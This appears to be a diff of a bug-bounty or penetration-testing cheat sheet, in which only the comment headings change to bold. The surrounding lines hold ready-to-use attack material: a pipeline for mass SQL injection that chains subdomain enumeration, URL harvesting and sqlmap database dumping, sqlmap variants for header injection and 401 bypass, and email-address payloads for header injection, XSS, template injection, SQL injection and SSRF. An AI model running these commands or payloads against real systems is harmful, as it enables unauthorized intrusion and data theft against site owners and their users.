@@ -100,13 +100,13 @@ $ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 # SQL Injection Tips
 
 ```
-// MASS SQL injection
+// **MASS SQL injection**
 $ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
 $ cat domain.txt | gauplus -random-agent -t 200 | gf sqli | tee domain2.txt
 $ sqlmap -m domain2.txt -dbs --batch --random-agent
-// SQL Injection headers:
+// **SQL Injection headers**
 $ sqlmap -u "http://redacted.com" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10
-// SQL Injection bypass 401
+// **SQL Injection bypass 401**
 $ sqlmap -u "http://redacted.com" --dbs --batch --random-agent --forms --ignore-code=401
 ```
 
@@ -192,20 +192,20 @@ http://0177.00.00.01
 # Email Attacks 
 
 ```
-// Header Injection
+// **Header Injection**
 "%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
 "recipient@test.com>\r\nRCPT TO:<victim+"@test.com
-// XSS Injection
+// **XSS Injection**
 test+(<script>alert(0)</script>)@example.com
 test@example(<script>alert(0)</script>).com
 "<script>alert(0)</script>"@example.com
-// SST Injection
+// **SST Injection**
 "<%= 7 * 7 %>"@example.com
 test+(${{7*7}})@example.com
-// SQL Injection
+// **SQL Injection**
 "' OR 1=1 -- '"@example.com
 "mail'); SLEEP(5);--"@example.com
-// SSRF Attack
+// **SSRF Attack**
 john.doe@abc123.burpcollaborator.net
 john.doe@[127.0.0.1]
 ```
